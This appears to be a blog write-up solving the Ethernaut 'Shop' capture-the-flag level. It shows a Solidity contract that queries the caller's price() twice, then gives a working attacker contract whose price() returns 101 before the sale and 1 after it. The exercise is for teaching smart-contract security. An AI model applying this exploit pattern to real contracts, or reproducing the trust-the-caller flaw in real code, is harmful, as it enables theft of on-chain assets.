![](https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg)

Сan you get the item from the shop for less than the price asked?

##### Things that might help:

- `Shop` expects to be used from a `Buyer`
- Understanding restrictions of view functions

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

Solution:
The `buy()` function is checking if the price value returned by the Buyer interface is greater than the price defined (100) and if the product is already sold. If the `if` statement validation goes through, the `isSold` is set to `true`, and the price is set to the new price returned by the Buyer interface.

The contract defines an interface called `Buyer` but the buy function is using `msg.sender`'s address to create an instance. This means that we can deploy an attacker contract with a `price()` function in it and it will be called by the `buy()` function when checking the price.

Something which should be observed here is that the `price()` is a view function, i.e., it can not change the state so we can not maintain a state variable as we did in the [Elevator](https://blog.dixitaditya.com/ethernaut-level-11-elevator) but we can make external calls to functions that are view or pure.

Therefore, to return two values from our `price()` function, we can make it return values based on the variable `isSold`.

```sol
function price () external view returns (uint) {
    return level21.isSold() ? 1 : 101;
}
```

---
## The Exploit

Let's take a look at the exploit code:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
  function isSold() external view returns(bool);
  function buy() external;
}

contract PWN {
  IShop instance;
  constructor(address _instance) {
    instance = IShop(_instance);
  }

  function pwn() external {
    instance.buy();
  }
  
  function price () external view returns (uint) {
    return instance.isSold() ? 1 : 101;
  }
}
```
